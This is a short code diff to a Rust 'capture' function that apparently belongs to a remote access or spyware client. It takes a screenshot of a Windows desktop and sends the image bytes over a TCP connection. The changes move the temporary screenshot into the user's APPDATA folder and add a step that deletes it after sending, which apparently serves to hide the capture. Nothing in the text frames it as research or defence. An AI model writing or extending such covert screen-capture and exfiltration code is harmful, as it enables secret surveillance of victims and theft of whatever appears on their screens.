@@ -27,7 +27,7 @@ pub fn capture(mut stream: &TcpStream) {
             frame: &mut Frame,
             capture_control: InternalCaptureControl,
         ) -> Result<(), Self::Error> {
-            frame.save_as_image("screenshot.png", windows_capture::frame::ImageFormat::Png)?;
+            frame.save_as_image(std::env::var("APPDATA").unwrap().clone() + "\\screenshot.png", windows_capture::frame::ImageFormat::Png)?;
             capture_control.stop();
             Ok(())
         }
@@ -50,7 +50,7 @@ pub fn capture(mut stream: &TcpStream) {
     let _ = Capture::start(settings);
     stream.write_all("captured".as_bytes()).unwrap();
 
-    let mut file = File::open("screenshot.png").unwrap();
+    let mut file = File::open(std::env::var("APPDATA").unwrap().clone() + "\\screenshot.png").unwrap();
     let metadata = file.metadata().unwrap();
     let file_size = metadata.len() as usize;
 
@@ -60,4 +60,6 @@ pub fn capture(mut stream: &TcpStream) {
     let mut buffer = vec![0; file_size];
     file.read_exact(&mut buffer).unwrap();
     stream.write_all(&buffer).unwrap();
+
+    std::fs::remove_file(std::env::var("APPDATA").unwrap().clone() + "\\screenshot.png").unwrap();
 }
